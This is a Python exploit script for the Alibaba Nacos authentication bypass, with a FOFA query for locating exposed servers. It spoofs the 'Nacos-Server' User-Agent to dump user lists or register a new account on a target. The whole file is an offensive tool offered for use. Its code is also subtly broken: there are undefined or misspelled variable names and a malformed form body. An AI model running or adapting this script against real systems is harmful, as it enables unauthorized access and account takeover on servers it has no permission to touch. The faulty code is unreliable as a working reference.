#!/usr/bin/python3
#fofa search: title="Nacos"
#Author Drunkmars


import sys
import requests
import time
import json
from requests.packages.urllib3.exceptions import InsecureRequestWarning

if(len(sys.argv) < 2):
	print("                                                                                     ")
	print("|-----------------------------------------------------------------------------------|")
	print("|                                  Alibaba Nacos                                    |")
	print("|                                                                                   |")
	print("|      UseAge:   python3 exploit.py moudle url username password                    |")
	print("|                                                                                   |")	
	print("|      Example:                                                                     |")
	print("|                                                                                   |")
	print("|              1.python3 exploit.py read https://192.168.1.1/                       |")	
	print("|                                                                                   |")
	print("|              2.python3 exploit.py register https://192.168.1.1/ user password     |")
	print("|___________________________________________________________________________________|")
	print("                                                                                     ")
	exit()

modoule = sys.argv[1]

headers = {
                    "User-Agent": "Nacos-Server",
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                    "Accept-Language": "zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3",
                    "Accept-Encoding": "gzip, deflate",
                    "DNT": "1",
                    "Content-Type": "application/x-www-form-urlencoded"
	}

print("[!] --------Attacking the target,please wait!--------")
print("[/]==================================================")

if (sys.argv[1] == 'read'):
	if(len(sys.argv) < 3):
		print("python3 exploit.py read https://192.168.1.1")
		exit()
	else:
		target = sys.argv[2]
		Realpayload = target + "nacos/v1/auth/users?pageNo=1&pageSize=100"

		try:
			requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

			response = requests.get(url = payload , headers = headers ,verify = False , timeout = 10)
			if(response.status_code == 200):
				print("[+] Read user successfully!")
				response_json = json.dumps(response.json(), indent=4)
				print(response_json)
				response.close()
				exit()

			else:
				print("[-] Read user failed!")
				exit()

		except Exception as e:
			print("[-] Server error!")
			exit()

elif(sys.argv[1] == 'register'):
	if(len(sys.argv) < 5):
		exit()

	else:
		target = sys.argv[2]
		username = sys.argv[3]
		password = sys.argv[4]
		data = "username" + username + "&" + "password=" + password
		Registpayload = target + "nacos/v1/auth/users"

		try:
			requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)
			response = requests.post(url = Rigistpayload,data = data,headers = headers,verify =False,timeout = 10)

			if(response.status_code == 200):
				print("[+] Target can vulnable!")
				time.sleep(2)
				print("[+] Regist successfully!")
				print("Username:" + username)
				print("password:" + password)
				response.close()
				exit()

			else:
				print("[-] Target can not vulnable!")
				print("[-] Exploit Failed!")
				exit()
		except Exception as e:
			print("[-] Server error!")
			exit()

else:
	print("[-] Error moudle!")
	print("Please useing \"read\" or \"register\"")
	exit()
